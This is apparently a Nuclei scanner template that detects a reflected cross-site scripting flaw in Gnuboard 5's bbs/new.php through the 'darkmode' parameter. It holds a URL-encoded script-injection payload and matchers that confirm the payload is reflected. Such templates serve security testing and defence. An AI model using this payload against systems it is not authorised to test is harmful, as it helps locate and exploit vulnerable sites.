id: gnuboard5-xss

info:
  name: Gnuboard 5 - Cross-Site Scripting
  severity: medium
  tags: xss,gnuboard5

http:
  - method: GET
    path:
      - "{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(document.domain)</script>"
      - type: word
        part: header
        words:
          - text/html
      - type: status
        status:
          - 200
